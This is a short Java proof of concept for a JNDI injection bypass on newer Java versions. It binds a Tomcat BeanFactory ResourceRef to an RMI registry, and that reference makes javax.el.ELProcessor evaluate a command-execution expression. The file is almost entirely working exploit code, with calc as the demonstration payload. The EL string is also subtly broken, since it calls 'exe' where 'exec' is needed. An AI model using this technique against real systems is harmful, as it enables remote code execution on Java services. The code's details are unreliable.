import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;

public class JNDIBypassHighJavaServerRebind {
    public static void main(String[] args) throws Exception{

        InitialContext initialContext = new InitialContext();
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",
                true,"org.apache.naming.factory.BeanFactory",null );
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x","Runtime.getRuntime().exe('calc')" ));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
        
    }
}
